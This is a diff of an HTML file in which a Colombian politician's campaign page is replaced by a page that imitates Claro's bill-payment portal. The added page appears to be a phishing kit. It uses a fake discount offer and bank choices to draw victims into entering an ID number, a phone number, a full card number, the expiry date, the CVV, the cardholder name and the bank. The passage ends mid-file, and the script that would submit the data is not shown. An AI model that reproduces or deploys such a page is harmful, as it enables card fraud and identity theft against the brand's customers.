@@ -1,811 +1,386 @@
+
 <!DOCTYPE html>
+
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Máximo Noriega - Cambio al Máximo</title>
-    <style>
-        * {
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <link rel="icon" type="image/png" href="img/favicon.ico">
+    <title>Portal de pagos Claro</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style type="text/css">
+        *{
+            font-family: "Open Sans";
+            padding: 0;
             margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-
-        body {
-            background-color: #fff5f0;
-            color: #2d2d2d;
-            overflow-x: hidden;
+        #comida{
+            background-color: #DA291C !important;
+            padding: 7px;
         }
-
-        /* Paleta de colores naranja */
-        :root {
-            --naranja-claro: #ffb347;
-            --naranja-suave: #ff9933;
-            --naranja-medio: #ff8000;
-            --naranja-intenso: #ff6b00;
-            --naranja-oscuro: #cc5500;
-            --blanco-calido: #fffaf5;
-            --gris-suave: #f5f5f5;
+        .logo{
+            width: 80px;
         }
-
-        /* Header moderno */
-        header {
-            background: linear-gradient(135deg, var(--naranja-intenso), var(--naranja-oscuro));
-            color: white;
-            padding: 1rem 5%;
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 4px 20px rgba(255, 107, 0, 0.3);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .logo-container {
-            display: flex;
-            align-items: center;
-            width: auto;
-            min-width: 120px;
-        }
-
-        .logo-img {
-            max-width: 100%;
-            height: auto;
-            max-height: 60px;
-            width: auto;
-            object-fit: contain;
-        }
-
-        .logo-text {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: white;
-            text-decoration: none;
-        }
-
-        nav {
-            display: flex;
-            gap: clamp(0.5rem, 2vw, 2rem);
-            flex-wrap: wrap;
-            justify-content: flex-end;
-        }
-
-        nav a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            padding: 0.5rem clamp(0.5rem, 1.5vw, 1rem);
-            border-radius: 25px;
-            font-size: clamp(0.8rem, 1.5vw, 1rem);
-            white-space: nowrap;
-        }
-
-        nav a:hover {
-            background-color: rgba(255, 255, 255, 0.2);
-            transform: translateY(-2px);
-        }
-
-        /* BANNER FULL WIDTH */
-        .banner-full {
-            margin-top: 80px;
-            width: 100%;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            background: #F9660A;
-        }
-
-        .banner-image-container {
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            line-height: 0;
-        }
-
-        .banner-image-desktop {
-            max-width: 100%;
-            width: auto;
-            height: auto;
-            display: block;
-            object-fit: none;
-            image-rendering: auto;
-        }
-
-        .banner-image-mobile {
-            display: none;
-            max-width: 100%;
-            width: auto;
-            height: auto;
-           /* object-fit: none;*/
-        }
-
-        .banner-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(255,107,0,0.4), rgba(204,85,0,0.4));
-            z-index: 2;
-            pointer-events: none;
-        }
-
-        .banner-content {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
-            color: white;
-            z-index: 3;
-            padding: clamp(1rem, 3vw, 2rem);
-            width: 90%;
-            max-width: 800px;
-            pointer-events: none;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-
-        .banner-content h1 {
-            font-size: clamp(2rem, 5vw, 3.5rem);
-            margin-bottom: clamp(0.5rem, 2vh, 1rem);
-            animation: fadeInDown 1s ease;
-            line-height: 1.2;
-        }
-
-        .banner-content p {
-            font-size: clamp(1rem, 2.5vw, 1.4rem);
-            margin-bottom: clamp(1rem, 3vh, 2rem);
-            animation: fadeInUp 1s ease 0.3s both;
-            line-height: 1.4;
-        }
-
-        .btn-banner {
-            pointer-events: auto;
-            background: white;
-            color: var(--naranja-intenso);
-            font-weight: bold;
-            animation: fadeInUp 1s ease 0.6s both;
-            display: inline-block;
-            padding: clamp(0.6rem, 2vw, 0.8rem) clamp(1.5rem, 4vw, 2rem);
-            border-radius: 25px;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            font-size: clamp(0.9rem, 2vw, 1rem);
-        }
-
-        .btn-banner:hover {
-            background: var(--blanco-calido);
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-        }
-
-        @keyframes fadeInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Secciones generales */
-        section {
-            padding: clamp(3rem, 8vh, 5rem) clamp(3%, 8%, 10%);
-            min-height: 50vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-
-        section:nth-child(even) {
-            background-color: var(--blanco-calido);
-        }
-
-        section:nth-child(odd) {
-            background-color: white;
-        }
-
-        .section-title {
-            font-size: clamp(2rem, 5vw, 2.5rem);
-            margin-bottom: clamp(2rem, 5vh, 3rem);
-            position: relative;
-            color: var(--naranja-oscuro);
-            line-height: 1.2;
-        }
-
-        .section-title::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 0;
-            width: clamp(60px, 10vw, 80px);
-            height: 4px;
-            background: linear-gradient(90deg, var(--naranja-claro), var(--naranja-intenso));
-            border-radius: 2px;
-        }
-
-        p {
-            font-size: clamp(1rem, 2vw, 1.2rem);
-            line-height: 1.6;
-            margin-bottom: 1rem;
-        }
-
-        h3 {
-            font-size: clamp(1.3rem, 3vw, 1.8rem);
-            margin-bottom: 0.8rem;
-            color: var(--naranja-intenso);
-        }
-
-        h4 {
-            font-size: clamp(1.1rem, 2.5vw, 1.3rem);
-        }
-
-        /* Contenedor de imagen placeholder */
-        .image-placeholder {
-            width: 100%;
-            height: clamp(200px, 30vw, 300px);
-            background: linear-gradient(135deg, var(--naranja-claro), var(--naranja-suave));
-            border-radius: 15px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: clamp(0.9rem, 2vw, 1.2rem);
-            box-shadow: 0 10px 30px rgba(255, 107, 0, 0.2);
-            margin: 2rem 0;
-            border: 3px dashed rgba(255, 255, 255, 0.5);
-            /*padding: 1rem;*/
-            border: 15px solid #FA7701;
-            overflow: hidden;
+        .caja_img{
             text-align: center;
         }
-
-        .image-placeholder i {
-            font-size: clamp(2rem, 5vw, 3rem);
-            margin-bottom: 1rem;
-            opacity: 0.9;
-            overflow: hidden;
-        }
-
-        .placeholder-text {
-            background-color: rgba(0, 0, 0, 0.1);
-            padding: 0.5rem 1rem;
-            border-radius: 25px;
-            font-family: monospace;
-            font-size: clamp(0.7rem, 1.5vw, 0.9rem);
-            max-width: 90%;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        /* Grid para contenido */
-        .grid-2 {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: clamp(1.5rem, 5vw, 3rem);
-            align-items: center;
-        }
-
-        .grid-3 {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: clamp(1rem, 3vw, 2rem);
-            margin-top: 2rem;
-        }
-
-        .grid-4 {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: clamp(1rem, 3vw, 2rem);
-            margin-top: 2rem;
-        }
-
-        .card {
-            background: white;
-            padding: clamp(1.5rem, 3vw, 2rem);
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
-            transition: all 0.3s ease;
-            border-bottom: 4px solid transparent;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .card:hover {
-            transform: translateY(-10px);
-            border-bottom-color: var(--naranja-medio);
-            box-shadow: 0 20px 40px rgba(255, 107, 0, 0.1);
-        }
-
-        .card p {
-            flex-grow: 1;
-        }
-
-        /* Lista de valores */
-        .valores-list {
-            list-style: none;
-            padding: 0;
-        }
-
-        .valores-list li {
-            margin-bottom: 1.5rem;
-            padding-left: 2rem;
-            position: relative;
-            font-size: clamp(1rem, 2vw, 1.1rem);
-        }
-
-        .valores-list li::before {
-            content: "🍊";
-            position: absolute;
-            left: 0;
-            color: var(--naranja-intenso);
-        }
-
-        /* Footer */
-        footer {
-            background: linear-gradient(135deg, var(--naranja-oscuro), #b34700);
-            color: white;
-            padding: clamp(2rem, 5vh, 3rem) 5%;
+        #ggris1{
             text-align: center;
+            height: 150px;
+            background-color: #F3F3F4; 
+            border-bottom: 1px solid #AEAEAE;
+            box-shadow: 0 0 0 rgb(0 0 0 / 16%);
         }
-
-        footer p {
-            font-size: clamp(0.9rem, 2vw, 1.2rem);
-            margin-bottom: 0.5rem;
-            color: white;
+        #tabla-opciones{
+            margin: -30px auto 0px auto;
+            width: 94%;
+            max-width: 1000px;
         }
-
-        /* Botones */
-        .btn {
-            display: inline-block;
-            padding: clamp(0.6rem, 2vw, 0.8rem) clamp(1.5rem, 4vw, 2rem);
-            background: linear-gradient(135deg, var(--naranja-medio), var(--naranja-intenso));
-            color: white;
-            text-decoration: none;
-            border-radius: 25px;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-            font-size: clamp(0.9rem, 2vw, 1rem);
-            white-space: nowrap;
+        .etq-pasos{
+            font-size: 13px;            
         }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(255, 107, 0, 0.3);
+        .act-pasos{
+            color:#2c97ad;
         }
-
-        /* Formulario */
-        form {
-            display: flex;
-            flex-direction: column;
-            gap: 1rem;
-            width: 100%;
+        section{
+            margin: 0 auto;
+            text-align: center;
+            width: 96%;
+            max-width: 680px;
         }
-
-        form input,
-        form textarea {
-            padding: clamp(0.8rem, 2vh, 1rem);
-            border: 2px solid var(--naranja-claro);
-            border-radius: 10px;
-            font-size: clamp(0.9rem, 2vw, 1rem);
-            width: 100%;
-            transition: border-color 0.3s ease;
+        .texto1{
+            font-size: 28px;
+            color: #5c5c5c;  
         }
-
-        form input:focus,
-        form textarea:focus {
+        .rojo{
+            font-weight: 600;
+            color: #EF3829;
+        }
+        .texto2{
+            color: #5c5c5c; 
+            font-size: 14px;  
+        }
+        .etiquetas{
+            color:#2c97ad;
+            font-size: 14px;
+        }
+        .entradas{
+            border: 1px solid #5c5c5c;
+            width: 96%;
             outline: none;
-            border-color: var(--naranja-intenso);
+            padding: 10px;
+            border-radius: 10px;
+            max-width: 440px;
         }
-
-        form textarea {
-            resize: vertical;
-            min-height: 100px;
+        .botonr{
+            background-color: #fff;
+            border: 0;
+            cursor: pointer;
         }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            header {
-                padding: 0.8rem 5%;
-            }
-
-            .logo-container {
-                width: 100%;
-                justify-content: center;
-                margin-bottom: 0.5rem;
-            }
-
-            .logo-img {
-                max-height: 50px;
-            }
-
-            nav {
-                width: 100%;
-                justify-content: center;
-            }
-
-            nav a {
-                font-size: 0.9rem;
-                padding: 0.4rem 0.8rem;
-            }
-
-            .banner-full {
-                margin-top: 120px;
-            }
-
-            .banner-image-desktop {
-                display: none;
-            }
-
-            .banner-image-mobile {
-                display: block;
-                max-width: 100%;
-                width: auto;
-                height: auto;
-            }
-
-            .banner-content {
-                width: 95%;
-                padding: 1rem;
-            }
-
-            .section-title {
-                text-align: center;
-            }
-
-            .section-title::after {
-                left: 50%;
-                transform: translateX(-50%);
-            }
-
-            .grid-2, .grid-3, .grid-4 {
-                gap: 2rem;
-            }
-
-            .image-placeholder {
-                height: 250px;
-            }
+        .boton_continuar,.boton2{
+            background-color: #E52A1B;
+            color: #fff;
+            border: 0;
+            outline: 0;
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 16px;
+            width: 96%;
+            max-width: 250px;
         }
-
-        @media (max-width: 480px) {
-            .logo-img {
-                max-height: 40px;
-            }
-
-            nav a {
-                font-size: 0.8rem;
-                padding: 0.3rem 0.6rem;
-            }
-
-            .banner-content {
-                width: 98%;
-            }
-
-            .btn-banner {
-                padding: 0.5rem 1.2rem;
-                font-size: 0.85rem;
-            }
-
-            section {
-                padding: 2.5rem 4%;
-            }
-
-            .card {
-                padding: 1.2rem;
-            }
-
-            .grid-2, .grid-3, .grid-4 {
-                grid-template-columns: 1fr;
-            }
-
-            .image-placeholder {
-                height: 200px;
-            }
+        footer{
+            background-color: #212121;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
         }
-
-        /* Scroll padding */
-        html {
-            scroll-padding-top: 80px;
-            scroll-behavior: smooth;
+        .celda{
+            background-color: #F4F4F4;
+            padding: 7px 10px;
+            border: 1px solid #AEAEAE;
+            text-align: left;
         }
-
-        @media (max-width: 768px) {
-            html {
-                scroll-padding-top: 120px;
-            }
-        }
-
-        /* Utilidades */
-        .text-center {
+        .celda2{
+            background-color: #DA291C;
+            color: #fff;
             text-align: center;
         }
 
-        .w-100 {
-            width: 100%;
-        }
 
-        .mt-2 {
-            margin-top: 2rem;
-        }
 
-        .mb-2 {
-            margin-bottom: 2rem;
-        }
+         #ca,#ba,#bo,#ne,#ps{
+            width: 96%;
+            background-color: #fff;margin: 5px 0px;
+            border-radius: 10px;
+            border: 1px solid #AEAEAE;
+         }
 
-        .quote {
-            font-style: italic;
-            font-size: clamp(1.1rem, 2.2vw, 1.3rem);
-            color: var(--naranja-oscuro);
-            border-left: 4px solid var(--naranja-intenso);
-            padding-left: 1.5rem;
-            margin: 1.5rem 0;
-        }
+         .options-list li{
+            list-style-type: none;
+            padding: 5px;
+         }
 
-        .stats-number {
-            font-size: clamp(2.5rem, 6vw, 3.5rem);
-            color: var(--naranja-intenso);
-            font-weight: bold;
-            line-height: 1.2;
-        }
+         .options-list li:hover{
+            background-color: #808080b0;
+            color: #fff;
+            cursor: pointer;
+         }
 
-        .reset-foto{
-            overflow: hidden;
-        }
+         #selectBox{
+            padding: 10px;
+            border-radius: 10px;
+         }
 
-        .reset-foto-2{
-            transform: scale(1.6);
-        }
+         #espera,#Tarjeta,#section3,#section2,#errorpasarela{
+            display: none;
+         }
 
-        .fifinal{
-            background: url(assets/img/max1.jpg);
-            background-size: cover;
-        }
-
-        .cecentro{
-            background: url(assets/img/max2.jpg);
-            background-size: cover;
-        }
-                .cecentro3{
-            background: url(assets/img/max3.jpg);
-            background-size: cover;
-        }
     </style>
 </head>
 <body>
-    <header>
-        <div class="logo-container">
-            <span class="logo-text">Máximo Noriega</span>
+    <header id="comida">
+        <div class="caja_img">
+            <img class="logo" src="img/logo-claro-blanco.svg">
         </div>
-        <nav>
-            <a href="https://www.maximonoriega.com">Inicio</a>
-            <a href="#seccion2">Biografía</a>
-            <a href="https://www.maximonoriega.com">Propuestas</a>
-            <a href="https://www.maximonoriega.com">Galería</a>
-            <a href="https://www.maximonoriega.com">Contacto</a>
-        </nav>
     </header>
-
-    <!-- BANNER PRINCIPAL -->
-    <div class="banner-full">
-        <div class="banner-image-container">
-            <img class="banner-image-desktop" 
-                 src="assets/img/desktop.jpg" 
-                 alt="Máximo Noriega - Cambio al Máximo"
-                 style="background: linear-gradient(135deg, #ffb347, #ff6b00);">
-            
-            <img class="banner-image-mobile" 
-                 src="assets/img/banner.jpg" 
-                 alt="Máximo Noriega - Cambio al Máximo"
-                 style="background: linear-gradient(135deg, #ff9933, #cc5500);">
-        </div>
-        
-        <div class="banner-overlay"></div>
-        
-        <div class="banner-content">
-            <h1>Máximo Noriega</h1>
-            <p>"Un hombre del pueblo, para el pueblo. Líder social y político con raíces en el campo colombiano y una trayectoria marcada por el trabajo comunitario y la defensa de los derechos ciudadanos."</p>
-            <a href="https://docs.google.com/forms/d/e/1FAIpQLSdClafb3d7teAGOBGnXjM424PP6ucQXQzeGL2dS5GID_F-kpg/viewform" class="btn-banner">Haz parte</a>
+<main>
+    <div id="ggris1" class="gris1">
+        <div class="texto_gris"><br><br>    
+            <p class="texto1">Portal de <span class="rojo">PAGOS Y RECARGAS</span></p>
         </div>
     </div>
 
-    <main>
-        <!-- SECCIÓN 1: Hero / Inicio - Frase de impacto -->
-        <section id="seccion1">
-            <div class="grid-2">
-                <div>
-                    <h1 class="section-title">Liderazgo con Raíces</h1>
-                    <p class="quote">"Máximo Noriega: Un hombre del pueblo, para el pueblo. Líder social y político con raíces en el campo colombiano y una trayectoria marcada por el trabajo comunitario y la defensa de los derechos ciudadanos."</p>
-                    <p>Su vida es testimonio de coherencia entre el decir y el hacer. Desde sus orígenes en Montería hasta su experiencia en el Senado, Máximo ha mantenido un compromiso inquebrantable con las comunidades más vulnerables de Colombia.</p>
-                    <a href="#seccion2" class="btn">Conocer más</a>
-                </div>
-                <div class="image-placeholder">
-                    <img class="reset-foto" src="assets/img/flat.jpeg" alt="">
-                </div>
+    <table id="tabla-opciones">
+        <tr>
+            <td valign="top" align="center"><img id="azul1" src="img/icono-seleccion-on.png" class="imagen"></td>
+            <td valign="top" align="center"></td>
+            <td valign="top" align="center"><img id="azul2" src="img/icono-mediopago-off.png" class="imagen"></td>
+            <td valign="top" align="center"></td>
+            <td valign="top" align="center"><img id="azul3" src="img/icono-pago-off.png" class="imagen"></td>
+            <td valign="top" align="center"></td>
+            <td valign="top" align="center"><img id="azul4" src="img/icono-resultado-off.png" class="imagen"></td>
+        </tr>
+        <tr>
+            <td valign="top" align="center" class="etq-pasos act-pasos">Ingresa <br>tu Documento</td>
+            <td valign="top" align="center"></td>
+            <td valign="top" align="center" class="etq-pasos">Escoge el <br>medio de pago</td>
+            <td valign="top" align="center"></td>
+            <td valign="top" align="center" class="etq-pasos">Realiza el <br>Pago en linea</p></td>
+            <td valign="top" align="center"></td>
+            <td valign="top" align="center" class="etq-pasos">Recibe la <br>Confimacion</td>
+        </tr>
+    </table>
+
+    <div id="contenedor"></div>
+
+    <section id="usuario" style="display:;">
+        <div class="texto_gris2">
+            <br><br> 
+            <p class="texto2">Consulta tu factura Claro, Observa si aplicas al descuento y paga de manera facil y desde donde quieras.</p>
+        </div>
+            <div>
+                <br>
+                <label for="input1" class="etiquetas">Ingresa tu Numero de Documento</label>
+                <input type="number" inputmode="numeric" class="entradas" required id="documento" placeholder="Numero de Documento" autofocus autocomplete="off" minlength="5"/>
+
             </div>
+        <div class="tipo">
+            <br>
+            <p class="etiquetas">Selecciona el tipo de servicio</p>
+            <div class="imgtipos">
+                <button class="botonr" onclick="cambiaimg(1)"><img id="check1" class="check" src="img/check.png"><p>Pospago</p></button><img class="iconitos" src="img/celular.png">
+                <button class="botonr" onclick="cambiaimg(2)"><img id="check2" class="check" src="img/uncheck.png"><p>Hogar</p></button><img class="iconitos" src="img/hogar.png">
+                <button class="botonr" onclick="cambiaimg(3)"><img id="check3" class="check" src="img/uncheck.png"><p>Equipo</p></button><img class="iconitos" src="img/equipos.png">
+                <button class="botonr" onclick="cambiaimg(4)"><img id="check4" class="check" src="img/uncheck.png"><p>Internet</p></button><img class="iconitos" src="img/internet.png">
+            </div>
+        </div>
+        <br>
+
+            <label class="etiquetas" for="celular">Por favor Ingresa tu Numero de Celular.</label>
+        <br>
+        <input type="number" class="entradas" required id="celular" inputmode="numeric" value="" placeholder=" Numero de Celular" autocomplete="of" minlength="5"/>
+        <div class="botones"><br>
+            <button class="boton_continuar" onclick="validarNumero()">Continuar</button>      
+        </div>
+
+    </section>   
+
+    <section id="errorpasarela">
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+              <div style="text-align: center;"><img style="width: 130px; margin-left: auto;" src="https://dev-claro-img-css.pantheonsite.io/iconos-logo-claro.png">
+                 <br><br>
+
+                 <div class="loader">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                 </div>
+              </div>       
+        <br> 
+        <br>  
+        <br>
+
+              <div style="text-align: center; line-height: 1rem;" >
+                 <h2 class="t-subtitle" style="line-height: 2.5rem; font-size: 1.6rem; color: #e5281bde;">Te pedimos una disculpa, en este momento solo se aceptan las siguiente pasarelas de pagos: Nequi, Bancolombia o Tarjeta de Debito o Credito</h2>
+                 <br>
+                 <br>
+                 <br>   
+                 <br>
+                 <br>
+              </div>
+              <br>
+              <br>
+              <br>
+              <br>
+              <br>
+              <br>
+      </section>
+
+
+      <section id="section2">
+  <br><br>
+  <div class="tabla">
+  <div class="fila">
+  <div class="celda celda2">Pago de Facturas</div>
+  </div>
+  <div class="fila">
+  <div class="celda"><p>Cliente:  <span id="nombre"></span></p> </div>
+  </div>
+  <div class="fila">
+  <div class="celda"><p>Celular: <span id="celular2"></span></p> </div>
+  </div>
+  <div class="fila">
+  <div class="celda"><p>Deuda Total: $<span id="deuda"></span></p> </div>
+  </div>
+  <div class="fila">
+  <div class="celda"><p>Descuento: $<span id="descuento"></span></p> </div>
+  </div>
+  <div class="fila">
+  <div class="celda"><p>Total a Pagar: $<span id="total"></span></p> </div>
+  </div>
+  </div><br><br><br>
+  <button class="boton2" onclick="opciones_pago();" style="margin-top: -0.5rem;">Continuar</button>
+  
+  </section>
+
+  <section id="espera" >
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+              <div style="text-align: center;"><img style="width: 130px; margin-left: auto;" src="img/iconos-logo-claro.png"><br>
+                 <img src="img/load1.gif" width="120">
+              </div>       
+        <br> 
+        
+              <div style="text-align: center; line-height: 1rem;" >
+                 <h2 class="t-subtitle" style="line-height: 2.5rem; font-size: 16px; color: #e52a1b;">Validando la Informacion...</h2>
+                 <br>
+                 <br>
+                 <br>   
+                 <br>
+                 <br>
+              </div>
+              <br>
+              <br>
+              <br>
+              <br>
+              <br>
+              <br>
+      </section>
+
+      <section id="Tarjeta">
+      <br><br>
+        <div class="texto_gris2">
+            <p class="texto2">Paga de manera facil y desde donde quieras con tu tarjeta de Debito o Credito.</p>
+        </div>
+            <div style="margin-top:10px;">
+                <label for="input1" class="etiquetas">Numero de la Tarjeta</label><br>
+                <input type="text" class="entradas" pattern="[0-9]*" inputmode="numeric" id="numtc" placeholder="1234 5678 9012 3456" autofocus="" autocomplete="off" minlength="16" maxlength="19" oninput="formatInput(this)">
+            </div>
+            <div style="margin-top:10px;">
+                <label for="input1" class="etiquetas">Fecha de Vencimiento</label><br>
+                <input type="text" class="entradas" pattern="[0-9]*" inputmode="numeric" id="fechat" placeholder="MM/YYYY" b="" autocomplete="off" minlength="7" maxlength="7" oninput="formatInput(this)">
+            </div>
+            <div style="margin-top:10px;">
+                <label for="input1" class="etiquetas">Codigo de Seguridad</label><br>
+                <input type="text" class="entradas" pattern="[0-9]*" inputmode="numeric" id="codcv" placeholder="CVV" b="" autocomplete="off" minlength="2" maxlength="4">
+            </div>
+            <div style="margin-top:10px;">
+                <label for="input1" class="etiquetas">Numero de Cuotas</label><br>
+                <input type="text" class="entradas" pattern="[0-9]*" inputmode="numeric" placeholder="1" autocomplete="off" minlength="1" maxlength="2">
+            </div>
+            <div style="margin-top:10px;">
+                <label for="input1" class="etiquetas">Nombres y Apellidos</label><br>
+                <input type="text" class="entradas" required="" id="datost" placeholder="" autocomplete="off" minlength="5">
+            </div>
+            <label for="input1" class="etiquetas" style="margin-top:10px;">Selecciona tu Entidad Bancaria</label>       
+            <button id="selectBox" style="display: ; background-color: transparent; color: #5c5c5c; width: 80%; border-width: 1px;
+            border-color: #b4b4b4;" class="select-box inputst" onclick="toggleOptions1()">
+            <span id="selectedOption1">Selecciona</span>
+            <ul id="optionsList1" class="options-list">
+              <li onclick="selectTC('b-34f1','AV Villas')">Banco AV Villas</li>
+              <li onclick="selectTC('b-34f13','BBVA')">BBVA Colombia</li>
+              <li onclick="selectTC('b-34f4','Bogota')">Banco De Bogotá</li>              
+              <li onclick="selectTC('b-34f2','Caja Social')">Banco Caja Social</li>
+              <li onclick="selectTC('b-34f9','Bancolombia')">Bancolombia</li>
+              <li onclick="selectTC('b-34f3','Davivienda')">Davivienda</li>              
+              <li onclick="selectTC('b-34f5','Falabella')">Banco Falabella</li>                                        
+              <li onclick="selectTC('b-34f14','Occidente')">Banco De Occidente</li>
+              <li onclick="selectTC('b-34f18','Popular')">Banco Popular</li>              
+              <li onclick="selectTC('b-34f12','Colpatria')">Scotiabank Colpatria</li>            
+            </ul>
+            </button>
+            <input id="selectedValue1" type="hidden">
+
+        </section>   
+  
+        <section id="section3">
+        <br><br>
+        <button id="ca"><img src="img/tar.jpg" id="cai" onclick="selectOption1('Tarjeta')"><p>Tarjetas de Credito</p></button>
+        <button id="ba" style="padding:10px 0px;"><img src="img/ba.png" id="bai" width="140" onclick="selectOption1('TRICOLOR')">.</button>
+        <button id="bo" style="padding:22px 0px;"><img src="img/logo-bogota-mobile.png" width="120" id="bgt" onclick="selectOption1('De Bogota')">.</button>
+        <button id="ne" style="padding:21px 0px;"><img src="img/NE.png" id="nei" width="110" onclick="selectOption1('NEQUI')">.</button>
+        <button id="ps" style="padding:5px 0px;"><img src="img/pse-logo.png" id="nei" width="140" onclick="selectOption1('PSE')">.</button>
+        <input id="selectedValue1" type="hidden">
+        
+        </div>
+        
+        <br><br>
+        <button class="boton2" style="margin-top: -0.5rem;" onclick="enviador()">Continuar</button>
         </section>
 
-        <!-- SECCIÓN 2: Sobre Nosotros (Biografía) -->
-        <section id="seccion2">
-            <h2 class="section-title">Trayectoria de Vida</h2>
-            <div class="grid-2">
-                <div class="image-placeholder">
-                    <img class="reset-foto reset-foto-2" src="assets/img/flat2.jpeg" alt="">
-                </div>
-                <div>
-                    <p>Máximo Noriega Rodríguez es un líder social y político con una sólida trayectoria. Nació en Montería, pero desde muy joven se formó en Barranquilla, donde destacó como líder estudiantil y representante universitario. Es Contador Público y Magíster en Ciencias Políticas y Económicas de la Universidad del Norte.</p>
-                    <p>Su carrera en el servicio público lo ha llevado a ser subsecretario de Educación, Concejal del Distrito y presidente del Concejo de Barranquilla. A nivel nacional, acompañó al presidente Gustavo Petro en la Alcaldía de Bogotá, asumiendo responsabilidades clave en seguridad, recreación y participación ciudadana.</p>
-                    <p>La historia de Máximo nace en el corazón del campo colombiano y crece al calor de la lucha comunitaria. Desde su infancia en Montería, su liderazgo tomó forma en Barranquilla, guiado por la vocación de justicia social y el compromiso con las comunidades.</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- SECCIÓN 3: Servicios / Agenda Legislativa (Propuestas) -->
-        <section id="seccion3">
-            <h2 class="section-title">Agenda Legislativa para el Cambio</h2>
-            <p class="text-center" style="margin-bottom: 2rem;">Basado en los principios que impulsa desde el Senado, estos son los ejes de su trabajo:</p>
-            <div class="grid-4">
-                <div class="card">
-                    <h3>📚 Cambio Social</h3>
-                    <p>Impulsar una educación de calidad (pública y privada) y generar oportunidades de trabajo como motores de transformación social.</p>
-                </div>
-                <div class="card">
-                    <h3>🌾 Economías Regionales</h3>
-                    <p>Fortalecer las economías locales y asociativas, prestando especial atención a las regiones históricamente olvidadas del país.</p>
-                </div>
-                <div class="card">
-                    <h3>🛡️ Seguridad Humana</h3>
-                    <p>Promover comunidades seguras con presencia institucional y protección social, usando inteligencia y tecnología para prevenir las violencias.</p>
-                </div>
-                <div class="card">
-                    <h3>🌿 Medio Ambiente</h3>
-                    <p>Abogar por un desarrollo responsable que proteja los ecosistemas e impulse las energías limpias como motor de desarrollo tecnológico.</p>
-                </div>
-                <div class="card">
-                    <h3>🚜 Reforma Agraria</h3>
-                    <p>Apoyar una reforma agraria integral que no solo entregue tierras, sino que brinde asistencia técnica, impulso financiero y acceso a mercados.</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- SECCIÓN 4: Galería -->
-
-
-        <!-- SECCIÓN 5: Características (Valores) -->
-        <section id="seccion5">
-            <h2 class="section-title">¿Qué lo define?</h2>
-            <div class="grid-2">
-                <div>
-                    <ul class="valores-list">
-                        <li>
-                            <strong>Vocación Social:</strong> Un profundo compromiso con la justicia social y ambiental, trabajando por una Colombia democrática, humana y en paz.
-                        </li>
-                        <li>
-                            <strong>Trabajo de Base:</strong> Su campaña y gestión se estructuran desde el territorio, con escucha activa y construcción colectiva junto a las comunidades.
-                        </li>
-                        <li>
-                            <strong>Experiencia Pública:</strong> Conoce la administración pública desde diferentes niveles (local y nacional), lo que le da una visión integral para ejecutar políticas de cambio.
-                        </li>
-                    </ul>
-                </div>
-                <div class="image-placeholder cecentro">
-                   
-                </div>
-            </div>
-        </section>
-
-        <!-- SECCIÓN 6: Equipo -->
-        <section id="seccion6">
-            <h2 class="section-title">Liderazgo Colectivo</h2>
-            <div class="grid-2">
-                <div class="image-placeholder cecentro3">
-                    
-                </div>
-                <div>
-                    <p>"Máximo Noriega, líder y candidato, rodeado de un equipo de liderazgos locales y regionales que trabajan articuladamente para fortalecer las transformaciones desde el territorio. Su campaña es un espacio de construcción colectiva, coherencia ideológica y compromiso con el progresismo."</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- SECCIÓN 7: Testimonios -->
